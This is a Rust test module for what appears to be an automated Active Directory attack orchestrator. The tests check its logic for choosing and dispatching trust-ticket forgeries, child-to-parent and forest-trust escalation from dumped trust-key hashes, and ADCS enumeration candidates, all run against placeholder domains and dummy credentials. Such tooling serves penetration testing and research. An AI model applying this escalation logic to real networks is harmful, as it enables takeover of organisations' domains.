    #[test]
    fn is_domain_related_one_empty() {
        assert!(!is_domain_related("contoso.local", ""));
    }

    #[test]
    fn trust_enum_dedup_key_password() {
        assert_eq!(
            trust_enum_dedup_key("Contoso.Local", false),
            "trust_enum:contoso.local"
        );
    }

    #[test]
    fn trust_enum_dedup_key_hash_retry() {
        assert_eq!(
            trust_enum_dedup_key("Contoso.Local", true),
            "trust_enum_hash:contoso.local"
        );
    }

    #[test]
    fn trust_enum_dedup_key_case_insensitive() {
        assert_eq!(
            trust_enum_dedup_key("CONTOSO.LOCAL", false),
            trust_enum_dedup_key("contoso.local", false)
        );
    }

    #[test]
    fn trust_enum_dedup_key_empty_domain() {
        assert_eq!(trust_enum_dedup_key("", false), "trust_enum:");
        assert_eq!(trust_enum_dedup_key("", true), "trust_enum_hash:");
    }

    // is_filtered_inter_forest_trust

    fn state_with_trust(domain: &str, trust: ares_core::models::TrustInfo) -> StateInner {
        let mut s = StateInner::new("op-test".into());
        s.trusted_domains.insert(domain.to_lowercase(), trust);
        s
    }

    #[test]
    fn filtered_inter_forest_intra_forest_returns_false() {
        let s = StateInner::new("op-test".into());
        // child↔parent — not inter-forest, never filtered.
        assert!(!is_filtered_inter_forest_trust(
            &s,
            "child.contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn filtered_inter_forest_explicit_filtering_on_still_tries_forge() {
        let trust = ares_core::models::TrustInfo {
            domain: "fabrikam.local".into(),
            flat_name: "FABRIKAM".into(),
            direction: "bidirectional".into(),
            trust_type: "forest".into(),
            sid_filtering: true,
            security_identifier: None,
        };
        let s = state_with_trust("fabrikam.local", trust);
        assert!(!is_filtered_inter_forest_trust(
            &s,
            "contoso.local",
            "fabrikam.local"
        ));
    }

    #[test]
    fn filtered_inter_forest_explicit_filtering_off() {
        let trust = ares_core::models::TrustInfo {
            domain: "fabrikam.local".into(),
            flat_name: "FABRIKAM".into(),
            direction: "bidirectional".into(),
            trust_type: "forest".into(),
            sid_filtering: false,
            security_identifier: None,
        };
        let s = state_with_trust("fabrikam.local", trust);
        assert!(!is_filtered_inter_forest_trust(
            &s,
            "contoso.local",
            "fabrikam.local"
        ));
    }

    #[test]
    fn auto_trust_follow_tries_forge_when_metadata_missing() {
        let s = StateInner::new("op-test".into());
        assert!(!is_filtered_inter_forest_trust(
            &s,
            "contoso.local",
            "fabrikam.local"
        ));
    }

    #[test]
    fn filtered_inter_forest_ignores_unrelated_source_metadata() {
        // A child-realm parent_child TrustInfo on the source must NOT answer
        // an unrelated cross-forest path: that would misclassify it as
        // intra-forest and let a doomed forge fire under the source's own
        // parent_child relationship. With no metadata for the actual target
        // we fall through to the no-metadata default (try the forge).
        let parent_trust = ares_core::models::TrustInfo {
            domain: "contoso.local".into(),
            flat_name: "CONTOSO".into(),
            direction: "bidirectional".into(),
            trust_type: "parent_child".into(),
            sid_filtering: false,
            security_identifier: None,
        };
        let s = state_with_trust("contoso.local", parent_trust);
        assert!(!is_filtered_inter_forest_trust(
            &s,
            "contoso.local",
            "fabrikam.local"
        ));
    }

    #[test]
    fn filtered_inter_forest_target_metadata_never_suppresses_cross_forest() {
        let target_trust = ares_core::models::TrustInfo {
            domain: "fabrikam.local".into(),
            flat_name: "FABRIKAM".into(),
            direction: "bidirectional".into(),
            trust_type: "forest".into(),
            sid_filtering: true,
            security_identifier: None,
        };
        let s = state_with_trust("fabrikam.local", target_trust);
        assert!(!is_filtered_inter_forest_trust(
            &s,
            "contoso.local",
            "fabrikam.local"
        ));
    }

    // resolve_target_fqdn_from_signals

    #[test]
    fn resolve_target_fqdn_from_signals_matches_via_host_suffix() {
        // Trust key `FABRIKAM$` captured on contoso side. fabrikam.local is
        // not in domain_controllers (no DC enum yet) but a host hostname
        // suffix in state proves the FQDN is real.
        let mut s = StateInner::new("op-test".into());
        s.hosts.push(ares_core::models::Host {
            ip: "192.168.58.50".into(),
            hostname: "dc01.fabrikam.local".into(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned: false,
        });
        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "contoso.local");
        assert_eq!(got.as_deref(), Some("fabrikam.local"));
    }

    #[test]
    fn resolve_target_fqdn_from_signals_matches_via_credential_domain() {
        // Trust key `FABRIKAM$` captured. fabrikam.local appears only as a
        // Credential domain — enough corroboration to accept.
        let mut s = StateInner::new("op-test".into());
        s.credentials.push(ares_core::models::Credential {
            id: String::new(),
            username: "alice".into(),
            password: "P@ssw0rd!".into(),
            domain: "fabrikam.local".into(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        });
        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "contoso.local");
        assert_eq!(got.as_deref(), Some("fabrikam.local"));
    }

    #[test]
    fn resolve_target_fqdn_from_signals_matches_via_vuln_domain() {
        // Trust key `FABRIKAM$` captured. fabrikam.local appears only as a
        // discovered-vuln details["domain"].
        let mut s = StateInner::new("op-test".into());
        let mut details = std::collections::HashMap::new();
        details.insert(
            "domain".to_string(),
            serde_json::Value::String("fabrikam.local".to_string()),
        );
        s.discovered_vulnerabilities.insert(
            "v1".into(),
            ares_core::models::VulnerabilityInfo {
                vuln_id: "v1".into(),
                vuln_type: "smb_signing_disabled".into(),
                target: "192.168.58.50".into(),
                discovered_by: String::new(),
                discovered_at: chrono::Utc::now(),
                details,
                recommended_agent: String::new(),
                priority: 5,
            },
        );
        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "contoso.local");
        assert_eq!(got.as_deref(), Some("fabrikam.local"));
    }

    #[test]
    fn resolve_target_fqdn_from_signals_rejects_when_no_corroborating_record() {
        // Regression guard against blind guessing. `FABRIKAM$` is in
        // hand but no Host / Credential / Vuln record references
        // fabrikam.local. Function MUST return None — the orchestrator
        // must not forge a ticket against a domain it can't observe.
        let s = StateInner::new("op-test".into());
        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "contoso.local");
        assert!(
            got.is_none(),
            "must not infer an FQDN from a NetBIOS label alone"
        );
    }

    #[test]
    fn resolve_target_fqdn_from_signals_rejects_label_mismatch() {
        // Host record exists for a different domain; the label-match guard
        // must reject the candidate.
        let mut s = StateInner::new("op-test".into());
        s.hosts.push(ares_core::models::Host {
            ip: "192.168.58.50".into(),
            hostname: "dc01.contoso.local".into(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned: false,
        });
        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "other.local");
        assert!(got.is_none());
    }

    #[test]
    fn resolve_target_fqdn_from_signals_rejects_source_domain_self_match() {
        // Even when a Host record matches the source domain's label,
        // we must skip it — a trust key for `<LABEL>$` is never used to
        // attack the same domain it lives on.
        let mut s = StateInner::new("op-test".into());
        s.hosts.push(ares_core::models::Host {
            ip: "192.168.58.10".into(),
            hostname: "dc01.contoso.local".into(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned: false,
        });
        let got = resolve_target_fqdn_from_signals(&s, "CONTOSO", "contoso.local");
        assert!(got.is_none(), "must not match the source domain");
    }

    #[test]
    fn resolve_target_fqdn_from_signals_skips_short_form_credential_domains() {
        // A Credential with a NetBIOS-form domain ("FABRIKAM") must not
        // be a corroborating signal — only FQDN-shaped entries qualify.
        // Without this guard, the function would echo back the very label
        // we're trying to resolve.
        let mut s = StateInner::new("op-test".into());
        s.credentials.push(ares_core::models::Credential {
            id: String::new(),
            username: "alice".into(),
            password: "P@ssw0rd!".into(),
            domain: "FABRIKAM".into(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        });
        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "contoso.local");
        assert!(got.is_none());
    }

    // classify_trust_escalation

    #[test]
    fn classify_trust_escalation_intra_forest_child_to_parent() {
        let (vuln_id, vuln_type, note_kind) =
            classify_trust_escalation("child.contoso.local", "contoso.local");
        assert_eq!(vuln_id, "child_to_parent_child_contoso_local_contoso_local");
        assert_eq!(vuln_type, "child_to_parent");
        assert_eq!(note_kind, "Child-to-parent escalation");
    }

    #[test]
    fn classify_trust_escalation_intra_forest_parent_to_child() {
        let (vuln_id, vuln_type, note_kind) =
            classify_trust_escalation("contoso.local", "child.contoso.local");
        assert_eq!(vuln_id, "child_to_parent_contoso_local_child_contoso_local");
        assert_eq!(vuln_type, "child_to_parent");
        assert_eq!(note_kind, "Child-to-parent escalation");
    }

    #[test]
    fn classify_trust_escalation_inter_forest() {
        let (vuln_id, vuln_type, note_kind) =
            classify_trust_escalation("contoso.local", "fabrikam.local");
        assert_eq!(vuln_id, "forest_trust_contoso.local_fabrikam.local");
        assert_eq!(vuln_type, "forest_trust_escalation");
        assert_eq!(note_kind, "Forest trust escalation");
    }

    // build_trust_escalation_vuln

    #[test]
    fn trust_vuln_intra_forest_uses_child_to_parent_tokens() {
        let v = build_trust_escalation_vuln(
            "child.contoso.local",
            "contoso.local",
            "CHILD$",
            "192.168.58.20",
        );
        assert_eq!(v.vuln_type, "child_to_parent");
        assert_eq!(
            v.vuln_id,
            "child_to_parent_child_contoso_local_contoso_local"
        );
        assert_eq!(v.target, "192.168.58.20");
        assert_eq!(v.priority, 1);
        assert_eq!(v.discovered_by, "trust_automation");
        let note = v.details.get("note").and_then(|x| x.as_str()).unwrap();
        assert!(note.starts_with("Child-to-parent escalation via CHILD$ trust key"));
        assert_eq!(
            v.details.get("source_domain").and_then(|x| x.as_str()),
            Some("child.contoso.local")
        );
        assert_eq!(
            v.details.get("target_domain").and_then(|x| x.as_str()),
            Some("contoso.local")
        );
        assert_eq!(
            v.details.get("trust_account").and_then(|x| x.as_str()),
            Some("CHILD$")
        );
    }

    #[test]
    fn trust_vuln_inter_forest_uses_forest_trust_tokens() {
        let v = build_trust_escalation_vuln(
            "contoso.local",
            "fabrikam.local",
            "FABRIKAM$",
            "192.168.58.40",
        );
        assert_eq!(v.vuln_type, "forest_trust_escalation");
        assert_eq!(v.vuln_id, "forest_trust_contoso.local_fabrikam.local");
        assert_eq!(v.target, "192.168.58.40");
        let note = v.details.get("note").and_then(|x| x.as_str()).unwrap();
        assert!(note.starts_with("Forest trust escalation via FABRIKAM$ trust key"));
    }

    #[test]
    fn trust_vuln_carries_source_target_and_trust_account_in_details() {
        let v = build_trust_escalation_vuln(
            "contoso.local",
            "fabrikam.local",
            "FABRIKAM$",
            "192.168.58.40",
        );
        // Required scoreboard fields populated.
        assert!(v.details.contains_key("source_domain"));
        assert!(v.details.contains_key("target_domain"));
        assert!(v.details.contains_key("trust_account"));
        assert!(v.details.contains_key("note"));
    }

    #[test]
    fn classify_trust_escalation_same_domain_treated_as_intra() {
        // is_inter_forest returns false for s == t, so the helper falls through
        // to the intra-forest branch. The auto loop suppresses self-trust later;
        // here we just pin the classification.
        let (_, vuln_type, _) = classify_trust_escalation("contoso.local", "contoso.local");
        assert_eq!(vuln_type, "child_to_parent");
    }

    #[test]
    fn classify_trust_escalation_case_insensitive() {
        let (vuln_id_a, _, _) = classify_trust_escalation("CHILD.Contoso.Local", "Contoso.Local");
        let (vuln_id_b, _, _) = classify_trust_escalation("child.contoso.local", "contoso.local");
        assert_eq!(vuln_id_a, vuln_id_b);
    }

    // --- sweep_stale_forge_in_flight -----------------------------------

    /// Simulate "in flight for longer than allowed" by offsetting the start
    /// timestamp into the past — direct Instant subtraction past program
    /// start would panic, so use checked_sub and fall back to "now" only if
    /// the test runner literally just booted.
    fn stale_instant() -> Instant {
        Instant::now()
            .checked_sub(FORGE_STALENESS_LIMIT + Duration::from_secs(1))
            .unwrap_or_else(Instant::now)
    }

    #[test]
    fn sweep_clears_stale_entry_and_unmarks_dedup() {
        let mut s = StateInner::new("op".into());
        let key = "trust_follow:contoso.local:fabrikam$".to_string();
        s.mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
        s.forge_in_flight.insert(key.clone(), stale_instant());

        let cleared = sweep_stale_forge_in_flight(&mut s);

        assert_eq!(cleared, vec![key.clone()]);
        assert!(s.forge_in_flight.is_empty());
        assert!(
            !s.is_processed(DEDUP_TRUST_FOLLOW, &key),
            "dedup must be unmarked so the next tick re-dispatches"
        );
    }

    #[test]
    fn sweep_keeps_fresh_entry_and_leaves_dedup_marked() {
        let mut s = StateInner::new("op".into());
        let key = "trust_follow:contoso.local:fabrikam$".to_string();
        s.mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
        s.forge_in_flight.insert(key.clone(), Instant::now());

        let cleared = sweep_stale_forge_in_flight(&mut s);

        assert!(
            cleared.is_empty(),
            "fresh forge_in_flight must not be swept"
        );
        assert_eq!(s.forge_in_flight.len(), 1);
        assert!(s.is_processed(DEDUP_TRUST_FOLLOW, &key));
    }

    #[test]
    fn sweep_only_touches_stale_entries() {
        let mut s = StateInner::new("op".into());
        let stale_key = "trust_follow:contoso.local:fabrikam$".to_string();
        let fresh_key = "trust_follow:contoso.local:padme$".to_string();
        s.mark_processed(DEDUP_TRUST_FOLLOW, stale_key.clone());
        s.mark_processed(DEDUP_TRUST_FOLLOW, fresh_key.clone());
        s.forge_in_flight.insert(stale_key.clone(), stale_instant());
        s.forge_in_flight.insert(fresh_key.clone(), Instant::now());

        let cleared = sweep_stale_forge_in_flight(&mut s);

        assert_eq!(cleared, vec![stale_key.clone()]);
        assert!(!s.is_processed(DEDUP_TRUST_FOLLOW, &stale_key));
        assert!(
            s.is_processed(DEDUP_TRUST_FOLLOW, &fresh_key),
            "fresh sibling entry must keep its dedup mark"
        );
        assert!(s.forge_in_flight.contains_key(&fresh_key));
    }

    #[test]
    fn sweep_no_op_when_map_empty() {
        let mut s = StateInner::new("op".into());
        let cleared = sweep_stale_forge_in_flight(&mut s);
        assert!(cleared.is_empty());
    }

    #[test]
    fn sweep_at_exactly_limit_clears() {
        // Boundary case: an entry exactly at the staleness limit should be
        // swept (the planner can't afford an off-by-one that keeps a doomed
        // dispatch stuck for one more tick).
        let mut s = StateInner::new("op".into());
        let key = "trust_follow:contoso.local:fabrikam$".to_string();
        s.mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
        s.forge_in_flight.insert(
            key.clone(),
            Instant::now()
                .checked_sub(FORGE_STALENESS_LIMIT)
                .unwrap_or_else(Instant::now),
        );

        let cleared = sweep_stale_forge_in_flight(&mut s);

        assert_eq!(cleared, vec![key]);
    }

    // collect_trust_follow_work_from_vulns

    fn make_trust_hash(domain: &str, account: &str, value: &str) -> ares_core::models::Hash {
        ares_core::models::Hash {
            id: format!("h-{account}"),
            username: account.into(),
            hash_value: value.into(),
            hash_type: "NTLM".into(),
            domain: domain.into(),
            cracked_password: None,
            source: String::new(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: true,
            trust_pair_label: None,
        }
    }

    fn forest_trust_vuln(
        source: &str,
        target: &str,
        account: &str,
        target_dc_ip: &str,
    ) -> ares_core::models::VulnerabilityInfo {
        build_trust_escalation_vuln(source, target, account, target_dc_ip)
    }

    #[test]
    fn vuln_driven_emits_work_when_hash_matches() {
        let mut s = StateInner::new("op".into());
        s.hashes.push(make_trust_hash(
            "contoso.local",
            "FABRIKAM$",
            "aad3b435b51404eeaad3b435b51404ee:1111111111111111",
        ));
        let v = forest_trust_vuln(
            "contoso.local",
            "fabrikam.local",
            "FABRIKAM$",
            "192.168.58.40",
        );
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);

        let work = collect_trust_follow_work_from_vulns(&s);
        assert_eq!(work.len(), 1);
        let w = &work[0];
        assert_eq!(w.dedup_key, "trust_follow:contoso.local:fabrikam$");
        assert_eq!(w.source_domain, "contoso.local");
        assert_eq!(w.target_domain, "fabrikam.local");
        assert_eq!(w.target_dc_ip.as_deref(), Some("192.168.58.40"));
        assert_eq!(w.hash.username, "FABRIKAM$");
    }

    #[test]
    fn vuln_driven_skips_when_no_matching_hash() {
        // Vuln names FABRIKAM$ but state only has a different trust key — the
        // dispatcher would have nothing to forge with, so skip the work item.
        let mut s = StateInner::new("op".into());
        s.hashes.push(make_trust_hash(
            "contoso.local",
            "OTHER$",
            "aad3b435b51404eeaad3b435b51404ee:2222222222222222",
        ));
        let v = forest_trust_vuln(
            "contoso.local",
            "fabrikam.local",
            "FABRIKAM$",
            "192.168.58.40",
        );
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);

        assert!(collect_trust_follow_work_from_vulns(&s).is_empty());
    }

    #[test]
    fn vuln_driven_skips_already_exploited() {
        let mut s = StateInner::new("op".into());
        s.hashes.push(make_trust_hash(
            "contoso.local",
            "FABRIKAM$",
            "aad3b435b51404eeaad3b435b51404ee:3333333333333333",
        ));
        let v = forest_trust_vuln(
            "contoso.local",
            "fabrikam.local",
            "FABRIKAM$",
            "192.168.58.40",
        );
        let id = v.vuln_id.clone();
        s.discovered_vulnerabilities.insert(id.clone(), v);
        s.exploited_vulnerabilities.insert(id);

        assert!(collect_trust_follow_work_from_vulns(&s).is_empty());
    }

    #[test]
    fn vuln_driven_skips_already_processed_dedup() {
        let mut s = StateInner::new("op".into());
        s.hashes.push(make_trust_hash(
            "contoso.local",
            "FABRIKAM$",
            "aad3b435b51404eeaad3b435b51404ee:4444444444444444",
        ));
        let v = forest_trust_vuln(
            "contoso.local",
            "fabrikam.local",
            "FABRIKAM$",
            "192.168.58.40",
        );
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.mark_processed(
            DEDUP_TRUST_FOLLOW,
            "trust_follow:contoso.local:fabrikam$".into(),
        );

        assert!(collect_trust_follow_work_from_vulns(&s).is_empty());
    }

    #[test]
    fn vuln_driven_skips_non_forest_trust_vuln_types() {
        // The vuln-driven fallback is scoped to cross-forest
        // (`forest_trust_escalation`) — intra-forest (`child_to_parent`)
        // work is built reliably by the hash-iteration path and would
        // double-emit if also picked up here.
        let mut s = StateInner::new("op".into());
        s.hashes.push(make_trust_hash(
            "child.contoso.local",
            "CHILD$",
            "aad3b435b51404eeaad3b435b51404ee:5555555555555555",
        ));
        let v = build_trust_escalation_vuln(
            "child.contoso.local",
            "contoso.local",
            "CHILD$",
            "192.168.58.20",
        );
        // Sanity check: this is the intra-forest variant.
        assert_eq!(v.vuln_type, "child_to_parent");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);

        assert!(collect_trust_follow_work_from_vulns(&s).is_empty());
    }

    #[test]
    fn vuln_driven_falls_back_to_resolve_dc_ip_when_target_empty() {
        let mut s = StateInner::new("op".into());
        s.hashes.push(make_trust_hash(
            "contoso.local",
            "FABRIKAM$",
            "aad3b435b51404eeaad3b435b51404ee:6666666666666666",
        ));
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.41".into());

        // Hand-craft a vuln with `target = ""` to exercise the resolve_dc_ip
        // fallback (`build_trust_escalation_vuln` always sets target, so we
        // build directly).
        let mut v = build_trust_escalation_vuln(
            "contoso.local",
            "fabrikam.local",
            "FABRIKAM$",
            "192.168.58.40",
        );
        v.target = String::new();
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);

        let work = collect_trust_follow_work_from_vulns(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_dc_ip.as_deref(), Some("192.168.58.41"));
    }

    #[test]
    fn vuln_driven_matches_hash_when_domain_field_empty() {
        // NTDS dumps occasionally land trust-key rows with empty `domain` —
        // historically a common source of silent skips in the hash-iteration
        // path. The vuln-driven path must still match those.
        let mut s = StateInner::new("op".into());
        let mut h = make_trust_hash(
            "",
            "FABRIKAM$",
            "aad3b435b51404eeaad3b435b51404ee:7777777777777777",
        );
        h.domain = String::new();
        s.hashes.push(h);
        let v = forest_trust_vuln(
            "contoso.local",
            "fabrikam.local",
            "FABRIKAM$",
            "192.168.58.40",
        );
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);

        let work = collect_trust_follow_work_from_vulns(&s);
        assert_eq!(work.len(), 1);
    }

    #[test]
    fn vuln_driven_prefers_current_over_history_key() {
        let mut s = StateInner::new("op".into());
        let mut history = make_trust_hash(
            "contoso.local",
            "FABRIKAM$",
            "aad3b435b51404eeaad3b435b51404ee:88888888",
        );
        history.id = "h-history".into();
        history.is_previous = true;
        let mut current = make_trust_hash(
            "contoso.local",
            "FABRIKAM$",
            "aad3b435b51404eeaad3b435b51404ee:99999999",
        );
        current.id = "h-current".into();
        current.is_previous = false;
        s.hashes.push(history);
        s.hashes.push(current);

        let v = forest_trust_vuln(
            "contoso.local",
            "fabrikam.local",
            "FABRIKAM$",
            "192.168.58.40",
        );
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);

        let work = collect_trust_follow_work_from_vulns(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].hash.id, "h-current");
    }

    #[test]
    fn native_adcs_enum_candidate_prefers_same_domain_password_user() {
        use super::is_native_adcs_enum_candidate;
        let mk = |user: &str, pw: &str, dom: &str| ares_core::models::Credential {
            id: String::new(),
            username: user.into(),
            password: pw.into(),
            domain: dom.into(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        };
        // Native user with a recovered password -> eligible enrollee.
        assert!(is_native_adcs_enum_candidate(
            &mk("alice", "P@ssw0rd!", "fabrikam.local"),
            "fabrikam.local"
        ));
        // Case-insensitive domain match.
        assert!(is_native_adcs_enum_candidate(
            &mk("alice", "P@ssw0rd!", "FABRIKAM.LOCAL"),
            "fabrikam.local"
        ));
        // Source-forest account (wrong domain) -> not native.
        assert!(!is_native_adcs_enum_candidate(
            &mk("admin", "P@ssw0rd!", "contoso.local"),
            "fabrikam.local"
        ));
        // Machine account -> excluded.
        assert!(!is_native_adcs_enum_candidate(
            &mk("web01$", "P@ssw0rd!", "fabrikam.local"),
            "fabrikam.local"
        ));
        // Uncracked (no plaintext) -> not a bind candidate.
        assert!(!is_native_adcs_enum_candidate(
            &mk("bob", "", "fabrikam.local"),
            "fabrikam.local"
        ));
    }
}
